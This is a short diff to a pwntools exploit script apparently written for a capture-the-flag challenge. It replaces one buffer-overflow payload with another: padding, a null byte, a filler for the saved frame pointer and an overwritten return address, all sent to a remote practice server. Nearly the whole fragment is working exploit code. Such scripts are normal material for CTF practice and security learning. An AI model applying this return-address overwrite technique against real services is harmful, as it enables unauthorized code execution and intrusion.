@@ -7,10 +7,9 @@ from pwn import *
 host , port = 'ctf.yuawn.idv.tw' , 10109
 y = remote( host , port )
 
-p = '\x00' * 24
-p += p32( 0x80484ce )
-
-log.success('Attack payload -> {}'.format(p))
+p = 'a' * 19 + '\x00'
+p += 'EBBP'
+p += p32( 0x804852b )
 
 y.send(p)
 
